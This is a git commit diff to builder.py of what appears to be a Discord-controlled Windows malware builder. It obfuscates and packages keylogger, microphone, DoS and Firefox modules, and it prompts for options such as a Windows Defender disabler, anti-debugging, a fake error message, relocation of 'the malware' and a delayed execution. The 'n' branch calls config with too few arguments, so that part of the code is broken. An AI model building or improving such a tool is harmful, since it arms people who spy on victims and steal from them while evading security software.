2553a069f5d796b1d55fc5544c1de5002326a7e9
Josakko <112590914+Josakko@users.noreply.github.com>
2023-10-05 22:20:56 +0200

    Update builder.py

--- builder.py
+++ builder.py
@@ -61,6 +61,7 @@ def obfuscate():
         subprocess.run(f"pyminifier -o build/modules/keylogger.py build/modules/keylogger.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/keylogger.py
         subprocess.run(f"pyminifier -o build/modules/mic.py build/modules/mic.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/mic.py
         subprocess.run(f"pyminifier -o build/modules/dos.py build/modules/dos.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/dos.py
+        subprocess.run(f"pyminifier -o build/modules/firefox.py build/modules/firefox.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/firefox.py
         progress.update(task1, advance=1)
     except:
         progress.stop()
@@ -79,7 +80,8 @@ def build(path, icon, upx=True, obf=True):
     else:
         UpxArg = ""
     
-    try:
+    try: 
+        #python -m nuitka main.py --clang --enable-plugins=tk-inter --disable-console --clean-cache=all --remove-output --output-dir=build --onefile --standalone # --windows-icon-from-ico={icon}
         subprocess.run(f"pyinstaller  --onefile -w -i {icon} --clean {UpxArg} build/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
         try:
             shutil.rmtree(os.path.join(os.getcwd(), "build"))
@@ -92,7 +94,7 @@ def build(path, icon, upx=True, obf=True):
         time.sleep(3)
     except:
         progress.stop()
-        print(Fore.RED +"[-] Please make sure you have pyinstaller, pyarmor and UPX installed under C:/UPX!"+ Style.RESET_ALL)
+        print(Fore.RED +"[-] Please make sure you have pyinstaller and UPX installed under C:/UPX!"+ Style.RESET_ALL)
         time.sleep(3)
         sys.exit(1)
     
@@ -108,8 +110,9 @@ def convert(value, name):
         sys.exit(0)
 
 
-def config(token, guild_id, interval, error, antidebug, defender, move):    
-    config = f"TOKEN = '{token}'\nGUILD_ID = '{guild_id}'\nINTERVAL = {interval}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}"
+def config(token, guild_id, interval, error, antidebug, defender, move, exec_delay, delay):    
+    config = f"TOKEN = '{token}'\nGUILD_ID = '{guild_id}'\nINTERVAL = {interval}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}\nEXEC_DELAY = {exec_delay}\nDELAY = {delay}"
+
     build_dir = os.path.join(os.getcwd(), "build")
     
     if os.path.exists(build_dir):
@@ -129,32 +132,45 @@ progress = Progress(
     TimeElapsedColumn()
 )
 
+while True:
+    token = input("[?] Enter bot token: ")
+    if not check_token(token): print(Fore.RED +"[-] Invalid bot token provided!"+ Style.RESET_ALL); continue
 
-token = input("[?] Enter bot token: ")
-if not check_token(token): print(Fore.RED +"[-] Invalid bot token provided!"+ Style.RESET_ALL); sys.exit(1)
-guild_id = input("[?] Enter server ID (guild ID): ")
-interval = input("[?] Enter interval for keylogger sending (in secondes): ")
-error = input("[?] Enable fake error? [Y/n]: ")
-antidebug = input("[?] Enable antidebug? [Y/n]: ")
-defender = input("[?] Enable win defender disabler? [Y/n]: ")
-move = input("[?] Move the malware to the special location? [Y/n]: ")
+    guild_id = input("[?] Enter server ID (guild ID): ")
+    interval = input("[?] Enter interval for keylogger sending (in secondes): ")
+    error = input("[?] Enable fake error? [Y/n]: ")
+    antidebug = input("[?] Enable antidebug? [Y/n]: ")
+    defender = input("[?] Enable win defender disabler? [Y/n]: ")
+    move = input("[?] Move the malware to the special location? [Y/n]: ")
+    exec_delay = input("[?] Enable delay before executing malware? [Y/n]: ")
+
+    if exec_delay.lower() == "y":
+        delay = input("[?] Enter how long to wait before executing malware (in seconds): ") 
+    else: 
+        delay = 0
 
 
-choice = input("> Do you want to edit building options[y/N]: ")
-if choice.lower() == "y":
-    obf = input("[?] Do you want to enable obfuscation? [Y/n]: ")
-    upx = input("[?] Use UPX? [Y/n]: ")
-    icon = input("[?] Enter icon file: ")
-    path = input("[?] Enter source code directory: ")
-    
-    config(token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
-    build(path, icon, convert(upx, "UPX"), convert(obf, "obfuscation"))
-    
-elif choice.lower() == "n":
-    config(token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
-    build("src", "icon.ico")
-    
-else:
-    print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
-    time.sleep(3)
-    sys.exit(0)
+    choice = input("> Do you want to edit building options[y/N]: ")
+    if choice.lower() == "y":
+        obf = input("[?] Do you want to enable obfuscation? [Y/n]: ")
+        upx = input("[?] Use UPX? [Y/n]: ")
+        icon = input("[?] Enter icon file: ")
+        path = input("[?] Enter source code directory: ")
+        
+        config(
+            token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), 
+            convert(defender, "defender disabler"), convert(move, "move"), convert(exec_delay, "execution delay"), delay
+            )
+        
+        build(path, icon, convert(upx, "UPX"), convert(obf, "obfuscation"))
+        break
+
+    elif choice.lower() == "n":
+        config(token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
+        build("src", "icon.ico")
+        break
+
+    else:
+        print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
+        time.sleep(3)
+        continue
